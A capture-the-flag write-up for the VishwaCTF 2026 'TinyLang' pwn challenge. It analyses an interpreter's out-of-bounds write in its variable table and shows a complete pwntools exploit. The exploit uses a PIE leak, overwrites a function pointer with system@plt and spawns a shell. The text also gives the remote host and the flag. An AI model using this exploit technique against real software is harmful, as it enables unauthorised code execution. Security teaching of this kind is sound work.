# TinyLang - VishwaCTF 2026 (PWN)

## Challenge Info
- **Name**: TinyLang
- **Category**: PWN
- **Remote**: `212.2.248.184:32745`
- **Author**: sh4d0w121
- **Description**: "I just created TinyLang a minimal, C-based interpreter that supports two simple commands: `let <name> = <value>` and `print <name>`. But it seems like it is not safe?!"
- **Flag**: `V15hw4CTF{cu570m_14ngu4g3_f4113d_83056354}`

## TL;DR
Out-of-bounds write in variable table: each `let` copies 64 bytes but entries are spaced 20 bytes apart. After 8 variables, the name copy overwrites a function pointer used by `print` when a variable isn't found. Overwrite it with `system@plt`, then `print sh` → `system("sh")`.

## Binary Analysis

```
ELF 64-bit LSB PIE executable, x86-64, stripped
RELRO:      Partial RELRO
Stack:      No canary
NX:         NX enabled
PIE:        PIE enabled
```

Key imports: `system`, `dladdr`, `fgets`, `strstr`, `strtol`, `strcmp`.

### PIE Leak

At startup, the binary calls `dladdr` on its own `.text` section and prints the result:
```
TinyLang v1.1
session started at: 0x5584cfb32000
```
This is `dli_fbase` — the PIE base address. Free leak.

### Data Layout (relative to PIE base)

| Address | Content |
|---------|---------|
| `0x40a0` | Variable table start (20 bytes/entry: 16 name + 4 value) |
| `0x4140` | Variable counter (int32) |
| `0x4148` | Function pointer 1 → `error_handler` (0x12a0) |
| `0x4150` | Function pointer 2 → `error_handler` (0x12a0) |

### `let` handler (0x13b0)

```c
// Pseudocode
void handle_let(char *input) {
    char *name = input + 4;           // skip "let "
    char *eq = strstr(name, " = ");   // find separator
    *eq = '\0';                       // null-terminate name
    long value = strtol(eq + 3, NULL, 10);

    int idx = counter;                // READ counter (before write)

    // Copy 64 bytes from input[4:68] to table[idx*20]
    memcpy(&table[idx*20 + 0x00], input+4,  16);  // chunk 0
    memcpy(&table[idx*20 + 0x10], input+20, 16);  // chunk 1
    memcpy(&table[idx*20 + 0x20], input+36, 16);  // chunk 2
    memcpy(&table[idx*20 + 0x30], input+52, 16);  // chunk 3

    int idx2 = counter;               // READ counter AGAIN (may be corrupted!)
    table[idx2*20 + 0x10] = (int)value;
    counter = idx2 + 1;
}
```

**Bug**: 64 bytes copied per entry, but entries are only 20 bytes apart → massive overlap. And **no bounds check** on the counter.

### `print` handler — variable not found path (0x1330)

When `print <name>` can't find the variable:
```asm
mov rdi, r12        ; rdi = variable name string
jmp qword [0x4150]  ; call function pointer with name as arg
```

Default: `0x4150` → `error_handler` at 0x12a0 which prints `"Error: %s\n"`.

At 0x12c0 there's a convenient `jmp system@plt` wrapper.

## Vulnerability

Each entry writes 64 bytes but advances the index by only 20, so entries overlap. Starting from entry 5, the 64-byte write reaches past the table into:
- `0x4140` — the counter (entries 5, 6, 7)
- `0x4150` — the function pointer (entries 6, 7)

Entry 7's write covers `0x412c`–`0x416b`, placing input bytes 40–47 directly at `0x4150`.

**Critical detail**: the counter at `0x4140` is re-read AFTER the name copy. If the copy corrupts it, the value write and counter increment use the wrong index. We must embed the correct counter value within the payload.

## Exploitation

### Step 1: PIE leak
Parse `"session started at: 0xADDR"` → PIE base.

### Step 2: Fill entries 0–4
Normal short `let varXXXX = N` commands. These don't reach the counter.

### Step 3: Entries 5–7 with counter preservation

Each payload is crafted as a `bytearray` with specific bytes at the positions that map to `0x4140`:

| Entry | Counter offset in input | What to set |
|-------|------------------------|-------------|
| 5 | byte 64 | `pack("<I", 5)` |
| 6 | byte 44 | `pack("<I", 6)` |
| 7 | byte 24 | `pack("<I", 7)` |

Entry 7 also places `pack("<Q", system_plt)` at input bytes 40–47 → overwrites `0x4150`.

### Step 4: Trigger
```
print sh
```
"sh" is not a defined variable → `jmp [0x4150]` → `system("sh")` → shell.

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import struct, time

context.arch = 'amd64'

HOST = "212.2.248.184"
PORT = 32745
BINARY = "./main_ltbov0N"

def exploit(r):
    r.recvuntil(b"session started at: ")
    leak = int(r.recvline().strip(), 16)
    log.info(f"PIE base: {hex(leak)}")

    system_plt = leak + 0x1070

    # Entries 0-4: normal
    for i in range(5):
        r.sendline(f"let var{i:04d} = {i}".encode())
        time.sleep(0.05)

    # Entry 5: preserve counter=5 at input byte 64
    p5 = bytearray(68)
    p5[0:4] = b"let "
    p5[4:30] = b"e" * 26
    p5[30:34] = b" = 5"
    p5[64:68] = struct.pack("<I", 5)
    r.sendline(bytes(p5))
    time.sleep(0.05)

    # Entry 6: preserve counter=6 at input byte 44
    p6 = bytearray(48)
    p6[0:4] = b"let "
    p6[4:30] = b"f" * 26
    p6[30:34] = b" = 6"
    p6[44:48] = struct.pack("<I", 6)
    r.sendline(bytes(p6))
    time.sleep(0.05)

    # Entry 7: counter=7 at byte 24, system@plt at bytes 40-47
    p7 = bytearray(48)
    p7[0:4] = b"let "
    p7[4:20] = b"g" * 16
    p7[20:24] = b" = 7"
    p7[24:28] = struct.pack("<I", 7)
    p7[40:48] = struct.pack("<Q", system_plt)
    r.sendline(bytes(p7))
    time.sleep(0.2)

    # Trigger: print nonexistent var -> system("sh")
    r.sendline(b"print sh")
    r.interactive()

if __name__ == "__main__":
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(BINARY)
    exploit(r)
```

## Key Takeaways
- **64-byte write with 20-byte stride** = classic out-of-bounds write through overlapping entries
- Counter is re-read after write → must be preserved in the payload to keep index calculations correct
- `dladdr` leak gives PIE base for free
- `jmp qword [ptr]` with controllable `rdi` + `system@plt` = instant shell

## Files
- `main_ltbov0N` — Challenge binary
- `solve.py` — Exploit script
- `flag.txt` — Flag
